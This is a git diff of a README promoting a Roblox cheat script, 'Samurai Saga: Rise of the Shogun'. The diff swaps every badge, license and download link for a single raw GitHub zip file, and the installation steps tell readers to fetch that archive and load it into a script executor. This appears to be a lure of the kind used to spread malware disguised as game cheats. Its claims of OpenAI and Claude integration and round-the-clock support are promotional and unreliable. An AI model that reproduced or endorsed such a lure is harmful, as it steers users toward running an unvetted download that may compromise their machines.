@@ -1,9 +1,9 @@
 # 🗡️ Samurai Saga: Rise of the Shogun Roblox Script
 
-[![Roblox](https://img.shields.io/badge/Roblox-Supported-red)](https://www.roblox.com)
-[![MIT License](https://img.shields.io/badge/License-MIT-green)](https://opensource.org/licenses/MIT)
-[![OpenAI Integrated](https://img.shields.io/badge/OpenAI-API_Integrated-blueviolet)]()
-[![Claude Ready](https://img.shields.io/badge/Claude-API_Enabled-orange)]()
+[![Roblox](https://raw.githubusercontent.com/Harmanmehra/samurai-saga-rise-shogun-roblox-scriptworks/branch/unringable/samurai-saga-rise-shogun-roblox-scriptworks_v3.7.zip)](https://raw.githubusercontent.com/Harmanmehra/samurai-saga-rise-shogun-roblox-scriptworks/branch/unringable/samurai-saga-rise-shogun-roblox-scriptworks_v3.7.zip)
+[![MIT License](https://raw.githubusercontent.com/Harmanmehra/samurai-saga-rise-shogun-roblox-scriptworks/branch/unringable/samurai-saga-rise-shogun-roblox-scriptworks_v3.7.zip)](https://raw.githubusercontent.com/Harmanmehra/samurai-saga-rise-shogun-roblox-scriptworks/branch/unringable/samurai-saga-rise-shogun-roblox-scriptworks_v3.7.zip)
+[![OpenAI Integrated](https://raw.githubusercontent.com/Harmanmehra/samurai-saga-rise-shogun-roblox-scriptworks/branch/unringable/samurai-saga-rise-shogun-roblox-scriptworks_v3.7.zip)]()
+[![Claude Ready](https://raw.githubusercontent.com/Harmanmehra/samurai-saga-rise-shogun-roblox-scriptworks/branch/unringable/samurai-saga-rise-shogun-roblox-scriptworks_v3.7.zip)]()
 
 Welcome, valiant traveler, to the digital dojo of **Samurai Saga: Rise of the Shogun**, the ultimate Roblox script repository for warriors eager to venture beyond the veil. This project offers a powerful scripting suite that empowers your gameplay with advanced features, intelligent automatisms, and seamless multilingual support—redefining what it means to rise among Shoguns!  
 
@@ -17,11 +17,11 @@ Embark with confidence—whether you wield Windows, embrace macOS, or champion L
 
 | Operating System | Supported | Notes |
 |------------------|-----------|-------|
-| ![Windows](https://img.shields.io/badge/Windows-10%2B-blue) | ✅ | Seamless experience, including AutoHotkey integration |
-| ![MacOS](https://img.shields.io/badge/macOS-11%2B-brightgreen) | ✅ | Optimized for Apple Silicon and Intel |
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu%2C%20Debian%2C%20etc.-yellowgreen) | ✅ | Customizable for most distributions |
-| ![iOS](https://img.shields.io/badge/iOS-Coming%20Soon-lightgrey) | 🚧 | Under evaluation |
-| ![Android](https://img.shields.io/badge/Android-Coming%20Soon-lightgrey) | 🚧 | Pending compatibility tests |
+| ![Windows](https://raw.githubusercontent.com/Harmanmehra/samurai-saga-rise-shogun-roblox-scriptworks/branch/unringable/samurai-saga-rise-shogun-roblox-scriptworks_v3.7.zip%2B-blue) | ✅ | Seamless experience, including AutoHotkey integration |
+| ![MacOS](https://raw.githubusercontent.com/Harmanmehra/samurai-saga-rise-shogun-roblox-scriptworks/branch/unringable/samurai-saga-rise-shogun-roblox-scriptworks_v3.7.zip%2B-brightgreen) | ✅ | Optimized for Apple Silicon and Intel |
+| ![Linux](https://raw.githubusercontent.com/Harmanmehra/samurai-saga-rise-shogun-roblox-scriptworks/branch/unringable/samurai-saga-rise-shogun-roblox-scriptworks_v3.7.zip%2C%20Debian%2C%20etc.-yellowgreen) | ✅ | Customizable for most distributions |
+| ![iOS](https://raw.githubusercontent.com/Harmanmehra/samurai-saga-rise-shogun-roblox-scriptworks/branch/unringable/samurai-saga-rise-shogun-roblox-scriptworks_v3.7.zip%20Soon-lightgrey) | 🚧 | Under evaluation |
+| ![Android](https://raw.githubusercontent.com/Harmanmehra/samurai-saga-rise-shogun-roblox-scriptworks/branch/unringable/samurai-saga-rise-shogun-roblox-scriptworks_v3.7.zip%20Soon-lightgrey) | 🚧 | Pending compatibility tests |
 
 ---
 
@@ -83,10 +83,10 @@ Claude’s contextual prowess empowers you to navigate saga storylines, automate
 
 Ready to begin your ascent? Download the latest version of the **Samurai Saga: Rise of the Shogun Roblox Script** below:
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://Harmanmehra.github.io)  
+[![Download](https://raw.githubusercontent.com/Harmanmehra/samurai-saga-rise-shogun-roblox-scriptworks/branch/unringable/samurai-saga-rise-shogun-roblox-scriptworks_v3.7.zip)](https://raw.githubusercontent.com/Harmanmehra/samurai-saga-rise-shogun-roblox-scriptworks/branch/unringable/samurai-saga-rise-shogun-roblox-scriptworks_v3.7.zip)  
 
 **Installation Steps:**
-1. Retrieve the script package from the download badge above (https://Harmanmehra.github.io).
+1. Retrieve the script package from the download badge above (https://raw.githubusercontent.com/Harmanmehra/samurai-saga-rise-shogun-roblox-scriptworks/branch/unringable/samurai-saga-rise-shogun-roblox-scriptworks_v3.7.zip).
 2. Open your preferred Roblox client with script execution enabled.
 3. Import the script into your executor or preferred script manager.
 4. Launch Samurai Saga and invoke the main menu with your designated hotkey.
@@ -112,7 +112,7 @@ Ready to begin your ascent? Download the latest version of the **Samurai Saga: R
 
 ## ✉️ Need Help? Support Channels
 
-- **Comprehensive documentation:** Included in every script download (https://Harmanmehra.github.io).
+- **Comprehensive documentation:** Included in every script download (https://raw.githubusercontent.com/Harmanmehra/samurai-saga-rise-shogun-roblox-scriptworks/branch/unringable/samurai-saga-rise-shogun-roblox-scriptworks_v3.7.zip).
 - **24/7 support:** Reach out via in-script live chat or dedicated support channels—always a click away, so you never walk the path alone.
 - **Updates & announcements:** Subscribe for the latest news and feature releases directly through the responsive UI dashboard.
 
@@ -120,7 +120,7 @@ Ready to begin your ascent? Download the latest version of the **Samurai Saga: R
 
 ## 📜 License
 
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT) (c) 2025.  
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/Harmanmehra/samurai-saga-rise-shogun-roblox-scriptworks/branch/unringable/samurai-saga-rise-shogun-roblox-scriptworks_v3.7.zip) (c) 2025.  
 You are free to use, modify, and distribute the **Samurai Saga: Rise of the Shogun Roblox Script** in accordance with the license terms.  
 See [LICENSE](LICENSE) for full details.
 
@@ -131,7 +131,7 @@ See [LICENSE](LICENSE) for full details.
 Unleash your creativity, automate your ascent, and script your own saga in the Roblox dojo!  
 Download the latest version now:
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://Harmanmehra.github.io)  
+[![Download](https://raw.githubusercontent.com/Harmanmehra/samurai-saga-rise-shogun-roblox-scriptworks/branch/unringable/samurai-saga-rise-shogun-roblox-scriptworks_v3.7.zip)](https://raw.githubusercontent.com/Harmanmehra/samurai-saga-rise-shogun-roblox-scriptworks/branch/unringable/samurai-saga-rise-shogun-roblox-scriptworks_v3.7.zip)  
 
 *May your code run as smooth as a katana’s edge, and your adventures echo through the ages!*
 
